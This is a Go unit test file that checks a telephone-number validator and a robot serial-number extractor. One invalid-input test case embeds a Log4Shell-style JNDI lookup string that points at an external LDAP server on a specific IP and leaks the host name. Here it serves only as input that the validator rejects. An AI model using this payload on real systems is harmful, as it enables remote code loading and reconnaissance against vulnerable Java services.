package util

import (
	"reflect"
	"testing"
)

func TestValidateTelephone(t *testing.T) {
	type args struct {
		telephone string
	}
	tests := []struct {
		name string
		args args
		want bool
	}{
		{
			name: "正常手机号",
			args: args{
				telephone: "15750973378",
			},
			want: true,
		},
		{
			name: "包含非数字手机号",
			args: args{
				telephone: "${jndi:ldap://11.187.178.158:1389/jdk18d4164e94ce19e1e77d44720dd975b1fa-/-${hostName}}",
			},
			want: false,
		},
		{
			name: "非正常手机号",
			args: args{
				telephone: "01575098332",
			},
			want: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ValidateTelephone(tt.args.telephone); got != tt.want {
				t.Errorf("ValidateTelephone() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestExtractRobotSerialNumber(t *testing.T) {
	type args struct {
		names []string
	}
	tests := []struct {
		name string
		args args
		want []uint32
	}{
		{
			name: "case 1",
			args: args{
				names: []string{"test-1", "test01", "test01", "test03"},
			},
			want: []uint32{1, 1, 3},
		},
		{
			name: "case 2",
			args: args{
				names: []string{"test", "test01", "test02", "test03"},
			},
			want: []uint32{1, 2, 3},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ExtractRobotSerialNumber(tt.args.names); !reflect.DeepEqual(got, tt.want) {
				t.Errorf("ExtractRobotSerialNumber() = %v, want %v", got, tt.want)
			}
		})
	}
}
